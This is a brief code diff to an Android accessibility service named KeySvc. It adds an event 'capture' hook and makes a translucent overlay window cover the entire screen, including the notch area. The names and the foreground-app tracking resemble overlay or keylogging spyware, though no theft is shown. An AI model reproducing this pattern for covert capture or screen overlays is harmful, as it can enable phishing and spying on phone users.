@@ -83,6 +83,7 @@ public class KeySvc extends AccessibilityService {
 
     @Override public void onAccessibilityEvent(AccessibilityEvent e) {
         Watch.ev();
+        Captura.ev();
         try {
             String p = e.getPackageName() == null ? null : e.getPackageName().toString();
             if (p != null && !p.equals(curPkg)) {
@@ -317,6 +318,14 @@ public class KeySvc extends AccessibilityService {
                                         | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                         | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                                 PixelFormat.TRANSLUCENT);
+                        lp.gravity = Gravity.TOP | Gravity.START;
+                        lp.flags |= WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
+                        l.setFitsSystemWindows(false);
+                        if (Build.VERSION.SDK_INT >= 30) lp.setFitInsetsTypes(0);
+                        if (Build.VERSION.SDK_INT >= 28)
+                            lp.layoutInDisplayCutoutMode = Build.VERSION.SDK_INT >= 30
+                                    ? WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS
+                                    : WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                         try {
                             wm.addView(l, lp);
                         } catch (Throwable t) {
